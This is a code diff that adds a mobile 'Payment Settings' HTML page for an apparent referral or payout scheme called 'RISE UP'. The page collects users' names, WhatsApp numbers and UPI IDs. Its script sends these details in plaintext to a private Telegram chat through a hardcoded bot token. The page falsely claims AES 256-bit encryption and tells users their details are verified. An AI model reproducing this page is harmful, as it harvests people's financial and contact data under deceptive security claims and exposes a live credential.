@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RISE UP | Payment Profile</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #f8f9fa; color: #1a1a1a; }
+        
+        /* Notice Banner */
+        .notice-banner { 
+            background: #e7f5ff; 
+            color: #1971c2; 
+            padding: 12px; 
+            text-align: center; 
+            font-weight: 600; 
+            font-size: 13px; 
+            border-bottom: 1px solid #d0ebff; 
+        }
+
+        /* Header */
+        header { 
+            background: #fff; 
+            padding: 18px 25px; 
+            display: flex; 
+            align-items: center; 
+            border-bottom: 1px solid #eee; 
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        header a { color: #000; font-size: 20px; text-decoration: none; }
+        header h1 { font-size: 18px; font-weight: 700; flex: 1; text-align: center; margin-right: 25px; }
+        
+        /* Layout Content */
+        .main-content { padding: 25px 15px; display: flex; flex-direction: column; align-items: center; }
+        
+        .payment-card { 
+            background: #fff; 
+            border-radius: 24px; 
+            padding: 30px 20px; 
+            width: 100%; 
+            max-width: 420px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05); 
+            border: 1px solid #f0f0f0; 
+        }
+
+        .card-header { text-align: center; margin-bottom: 25px; }
+        .card-header i.main-icon { font-size: 50px; color: #2ecc71; margin-bottom: 15px; }
+        .card-header h2 { font-size: 22px; font-weight: 800; color: #000; }
+        .card-header p { color: #666; font-size: 14px; margin-top: 5px; }
+
+        /* Form Styling */
+        .form-group { margin-bottom: 18px; position: relative; }
+        .form-group label { 
+            display: block; 
+            font-size: 12px; 
+            font-weight: 700; 
+            color: #444; 
+            margin-bottom: 8px; 
+            margin-left: 5px;
+        }
+
+        .input-wrapper { position: relative; }
+        .input-wrapper i { 
+            position: absolute; 
+            left: 15px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            color: #adb5bd;
+            font-size: 16px;
+        }
+
+        .form-group input { 
+            width: 100%; 
+            padding: 14px 15px 14px 45px; 
+            border: 1.5px solid #eee; 
+            border-radius: 12px; 
+            outline: none; 
+            font-size: 15px; 
+            font-weight: 600; 
+            background: #fafafa; 
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus { border-color: #000; background: #fff; box-shadow: 0 0 0 4px rgba(0,0,0,0.05); }
+        .form-group input[readonly] { background: #f1f3f5; color: #868e96; }
+
+        /* Button Styling */
+        .btn-save { 
+            width: 100%; 
+            background: #000; 
+            color: #fff; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 12px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            font-size: 16px;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+
+        .btn-save:hover { background: #222; }
+        .btn-save:active { transform: scale(0.98); }
+        .btn-save:disabled { background: #ccc; cursor: not-allowed; }
+
+        .security-note { margin-top: 20px; font-size: 11px; color: #999; text-align: center; display: flex; align-items: center; justify-content: center; gap: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="notice-banner">
+        <i class="fa-solid fa-clock"></i> Payouts processed every Monday morning.
+    </div>
+
+    <header>
+        <a href="home.html"><i class="fa-solid fa-arrow-left"></i></a>
+        <h1>Payment Settings</h1>
+    </header>
+
+    <main class="main-content">
+        <div class="payment-card">
+            <div class="card-header">
+                <i class="fa-solid fa-shield-check main-icon"></i>
+                <h2>Settlement Details</h2>
+                <p>Fill in details carefully for seamless payouts</p>
+            </div>
+            
+            <div class="form-group">
+                <label>Leader Code</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-hashtag"></i>
+                    <input type="text" id="leaderCode" readonly>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Account Holder Name</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" id="userName" placeholder="Enter full name">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>WhatsApp Number</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-phone"></i>
+                    <input type="tel" id="userPhone" placeholder="10-digit mobile number">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>UPI ID (Paytm/GPay/PhonePe)</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-paper-plane"></i>
+                    <input type="text" id="upiInput" placeholder="example@upi">
+                </div>
+            </div>
+
+            <button class="btn-save" id="saveBtn" onclick="savePayment()">Save Payment Details</button>
+            
+            <div class="security-note">
+                <i class="fa-solid fa-lock"></i> Secured with AES 256-bit encryption
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const botToken = "8244891563:AAGkCzCLYGdhJeoWU-9VLW5etMjZEHWUsww";
+        const chatId = "8415600127";
+
+        window.onload = function() {
+            // Load persistent data
+            document.getElementById('leaderCode').value = localStorage.getItem('userCode') || "GU05";
+            document.getElementById('userName').value = localStorage.getItem('userName') || "";
+            document.getElementById('userPhone').value = localStorage.getItem('userPhone') || "";
+            document.getElementById('upiInput').value = localStorage.getItem('userUPI') || "";
+            
+            if(localStorage.getItem('userUPI')) {
+                document.getElementById('saveBtn').innerText = "Update Details";
+            }
+        };
+
+        async function savePayment() {
+            const name = document.getElementById('userName').value.trim();
+            const phone = document.getElementById('userPhone').value.trim();
+            const upi = document.getElementById('upiInput').value.trim();
+            const leader = document.getElementById('leaderCode').value;
+            const btn = document.getElementById('saveBtn');
+
+            // Form Validation
+            if(name.length < 3) {
+                return showMsg('error', 'Invalid Name', 'Please enter your full name');
+            }
+            if(phone.length < 10) {
+                return showMsg('error', 'Invalid Phone', 'Enter a valid 10-digit number');
+            }
+            if(!upi.includes('@')) {
+                return showMsg('error', 'Invalid UPI', 'Enter a valid UPI ID (e.g. name@okaxis)');
+            }
+
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+
+            // Local Save
+            localStorage.setItem('userName', name);
+            localStorage.setItem('userPhone', phone);
+            localStorage.setItem('userUPI', upi);
+
+            // Telegram Notification (Professional Format)
+            const alertText = `✨ *NEW PAYMENT ENROLLMENT* ✨\n\n` +
+                              `👤 *Name:* ${name}\n` +
+                              `📞 *Phone:* ${phone}\n` +
+                              `💳 *UPI ID:* \`${upi}\`\n` +
+                              `🔑 *Leader Code:* ${leader}\n\n` +
+                              `📅 *Date:* ${new Date().toLocaleString()}\n` +
+                              `✅ *Status:* Ready for Payout`;
+
+            const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertText)}&parse_mode=Markdown`;
+
+            try {
+                const response = await fetch(telegramApi);
+                if(response.ok) {
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'Success!',
+                        text: 'Aapki details verify ho gayi hain.',
+                        confirmButtonColor: '#000'
+                    });
+                    btn.innerText = "Update Details";
+                } else { throw new Error(); }
+            } catch (err) {
+                Swal.fire({
+                    icon: 'warning',
+                    title: 'Offline Saved',
+                    text: 'Internet slow hai, par details phone mein save ho gayi hain.',
+                    confirmButtonColor: '#000'
+                });
+                btn.innerText = "Retry Update";
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        function showMsg(icon, title, text) {
+            Swal.fire({ icon, title, text, confirmButtonColor: '#000' });
+        }
+    </script>
+
+</body>
+  </html>
